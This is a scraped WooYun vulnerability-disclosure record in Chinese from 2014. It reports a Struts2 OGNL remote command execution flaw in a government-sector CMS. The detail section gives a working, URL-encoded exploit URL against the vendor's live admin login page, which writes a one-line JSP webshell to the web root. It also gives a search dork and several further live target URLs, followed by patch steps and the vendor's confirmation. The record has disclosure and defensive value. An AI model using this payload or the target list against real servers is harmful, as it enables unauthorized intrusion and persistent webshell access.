{"id": 55500, "wybug_id": "wooyun-2014-060733", "wybug_title": "某通用型cms系统存在命令执行漏洞", "wybug_corp": "www.linewell.com", "wybug_author": "伟哥", "wybug_date": "2014-05-20 12:14", "wybug_open_date": "2014-07-04 12:15", "wybug_type": "系统/服务补丁不及时", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-04：\t细节向公众公开  简要描述： 南威软件股份有限公司成立于2002年，公司是国内电子政务领域的信息化综合服务提供商，主要从事电子政务的软件开发、系统集成及技术服务，并以解决方案的方式向政务部门提供上述全部或部分业务。主营业务：公司主要以解决方案的方式向客户提供软件产品、系统集成和技术服务，建立满足客户工作需求的应用系统。公司的主营业务划分为三类：1、电子政务主要应用系统，主要包括权力阳光产品、党（军）委信息化产品； 2、社会管理与公共服务系统，主要包括智慧公安、平安城市等信息系统；3、行业应用支撑系统，主要包括云平台、整合平台、移动APP平台等。公司自2004年起至今被认定为高新技术企业；2009年起至今被认定为国家火炬计划重点高新技术企业；2010年被国家发改委等四部委评定为“国家规划布局内重点软件企业”。　　公司拥有计算机信息系统集成壹级资质、涉及国家秘密的计算机信息系统集成甲级资质、涉及国家秘密的计算机信息系统集成单项（软件开发）资质、安防工程企业壹级资质、建筑智能化工程设计与施工贰级资质、通过了CMMI3认证，是行业内取得资质和认证种类齐全、等级较高的企业。看到公司有 人才招聘的广告 有点心动貌似待遇还不错于是就有了 这次安全检测  ←_←  详细说明：  看到公司有 人才招聘的广告 有点心动貌似待遇还不错于是就有了 这次安全检测  ←_← 使用的应该是struts2的框架所以直接构造攻击代码那么这里就拿官网做测试 http://www.linewell.com/cms/admin/login.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22webshell.jsp%22).replaceAll(\"\\\\\\\\\",\"/\"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22content%22)).close()}&content=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e成功写入shell名称webshell.jsp其中，webshell.jsp表示我们保存在根目录下的文件名称，content表示我们提交的字段名称及写入文件的内容信息。写入的内容为一句话JSP的木马\n\n主站沦陷！\n\n关键字：inurl:admin/login.action 南威 http://www.syga.com.cn/cms/admin/login.actionhttp://www.linewell.com/cms/admin/login.actionhttp://qzfznews.net/cms/admin/login.action其他cms产品应该封装了struts2 应该也存在此漏洞 另：求小礼物   漏洞证明：  \n\n   修复方案：  1、删除工程的WEB-INF\\lib目录下的commons-lang3-3.1.jar、javassist-3.4.GA.jar、ognl- 3.0.5.jar、struts2-core-2.3.4.1.jar、xwork-core-2.3.4.1.jar（如果找不到完全对应的jar文件，请删除版本号较低的），然后复制lib文件夹中的jar文件到工程的WEB-INF\\lib目录下。2、修改web.xml文件中的Struts2过滤器配置如下：<filter> <filter-name>struts2</filter-name> <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class></filter>3、重启服务。如果想知道详细信息请在乌云私密我   版权声明：转载请注明来源 伟哥@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-05-25 09:02 厂商回复： cnvd确认并复现所述情况，已经转由cncert下发给江苏发中心处置。按通用衍生漏 洞进行评分，rank 12 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}